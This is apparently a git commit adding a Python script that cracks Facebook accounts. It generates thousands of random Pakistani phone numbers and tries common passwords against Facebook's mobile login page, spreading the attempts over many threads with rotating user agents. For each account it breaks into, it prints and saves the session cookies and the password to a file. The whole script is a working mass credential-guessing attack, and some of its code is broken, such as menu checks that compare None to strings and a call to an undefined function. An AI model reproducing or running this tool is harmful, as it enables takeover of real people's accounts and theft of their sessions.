0efe3245d80d92374aa06f6bc239bb1b5f5d78af
Ahsanali3342 <136950937+Ahsanali3342@users.noreply.github.com>
2023-06-18 10:18:51 +0500

    Add files via upload
    https://github.com/Ahsanali3342/X.git

---
+++ X.py
@@ -0,0 +1,227 @@
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os
+import random
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import mechanize
+from requests.exceptions import ConnectionError
+import string
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
+from datetime import datetime
+from bs4 import BeautifulSoup
+def KHALID():
+    os.system('clear')
+    jalan(logo)
+    jalan('\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m RANDOM CRACK ')
+    jalan('\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m CONTACT ME FACEBOOK')
+    jalan('\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m FOLLOW GITHUB ACCOUNT')
+    jalan('\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m FOLLOW PAGE')
+    jalan('\033[1;91m[\033[1;92m0\033[1;91m]\033[1;91m EXIT')
+    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;32mCHOOSE : ')
+    if opt == '1':
+        main()
+    if None == '2':
+        os.system('xdg-open https://youtube.com/@JUNGLI.244.gaming.')
+        return None
+    if None == '3':
+        os.system('xdg-open https://youtube.com/@JUNGLI.244.gaming.')
+        return None
+    if None == '4':
+        os.system('xdg-open https://youtube.com/@JUNGLI.244.gaming.')
+    if None == '0':
+        os.system('exit')
+        return None
+
+
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+P = '\x1b[1;97m' # 
+M = '\033[1;31m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;97m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+data,data2={},{}
+aman,cp,salah=0,0,0
+ubahP,fuck,pwBaru=[],[],[]
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://m.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+done = False
+
+ugen=[]
+for x in range(100):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.001)
+
+logo = """
+
+
+\033[1;36m░█████╗░██╗░░██╗░██████╗░█████╗░███╗░░██╗
+\033[1;36m██╔══██╗██║░░██║██╔════╝██╔══██╗████╗░██║
+\033[1;36m███████║███████║╚█████╗░███████║██╔██╗██║
+\033[1;36m██╔══██║██╔══██║░╚═══██╗██╔══██║██║╚████║
+\033[1;36m██║░░██║██║░░██║██████╔╝██║░░██║██║░╚███║
+\033[1;36m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""""      
+                                                                
+
+def main():
+    user=[]
+    os.system('clear')
+    print(logo)
+    jalan('\033[1;93m─────────────────────────────────────────────────────')
+    jalan('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;32mPAKISTANI CODE    - \033[1;32m0306 \033[1;32m0317 \033[1;32m0328 \033[1;32m0335')
+    jalan('\033[1;93m─────────────────────────────────────────────────────\n')
+    kode = input('\033[1;91mCHOOSE YOUR SIM CODE : ')
+    os.system('xdg-open https://youtube.com/@JUNGLI.244.gaming.')
+    os.system('clear')
+    print(logo)
+    limit = int(input('\033[1;92mEXAMPLE: 2000, 5000, 10000, 40000\n\n\033[1;91mCHOOSE CLONING LIMIT : '))
+    os.system('xdg-open https://youtube.com/@JUNGLI.244.gaming.')
+    for nmbr in range(limit):
+	    nmp = ''.join(random.choice(string.digits) for _ in range(8))
+	    user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+	    os.system('clear')
+	    print(logo)
+	    tl = str(len(user))
+	    print('\033[1;36m─────────────────────────────────────────────────────')
+	    print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m SIM CODE : \033[1;97m'+kode)
+	    print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+tl)
+	    print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m SBR KA PHAL 🍒 METHA HOTA HA')
+	    print('\033[1;93m─────────────────────────────────────────────────────')
+	    for guru in user:
+		    uid = kode+guru
+		    pwx = [guru, 'pakistan','Pakistan']
+		    yaari.submit(rcrack,uid,pwx,tl)
+    print('\nCRACK PROCESS HAS BEEN COMPLETED ')
+    print('\nIDS SAVED IN AHSAN-OK.txt')
+    print(54*'─')
+
+agents=[]
+
+def rcrack(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global agents
+	try:
+		for ps in pwx:
+			agents = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5628.199 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/112.0.5644.208 Chrome/112.0.5644.208 Safari/537.36','Mozilla/5.0 (Linux; Android 11; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5659.206 Mobile Safari/537.36','Mozilla/5.0 (Android; Tablet; rv:122.0) Gecko/122.0 Firefox/122.0','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/600.7.20 (KHTML, like Gecko) Version/10.0.94 Mobile/06AD7A Safari/623.28','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5615.203 Safari/537.36','Mozilla/5.0 (Android 10; Tablet; rv:117.0esr) Gecko/117.0esr Firefox/117.0esr','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14) AppleWebKit/629.16 (KHTML, like Gecko) Version/12.3.22 Safari/629.16','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20010101 Firefox/121.0','Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20071104 Firefox/115.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5618.212 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5651.198 Safari/537.36 Edg/112.0.1712.33','Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20070419 Firefox/118.0','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5619.212 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/630.24 (KHTML, like Gecko) Version/13.6.63 Safari/630.24','Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5625.214 Safari/537.36 Edg/111.0.1699.57','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5628.199 Safari/537.36 Edg/112.0.1698.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5660.226 Safari/537.36 OPR/97.0.3522.56','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5627.209 Safari/537.36']
+			session = requests.Session()
+			sys.stdout.write('\r\33[1;92m[AHSAN-%s] \33[1;90m[OK:\33[1;92m%s\33[1;90m]'%(loop,len(oks))),
+			sys.stdout.flush()
+			pro = random.choice(agents)
+			free_fb = session.get('https://free.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+			lo = session.get('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[AHSAN-OK]  ' +uid+ ' | ' +ps+    '  \n\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[‎AHSAN🍷] = \033[1;35m'+pro+'  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/AHSAN.txt', 'a').write(cid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+	except:
+		pass
+KHALID()
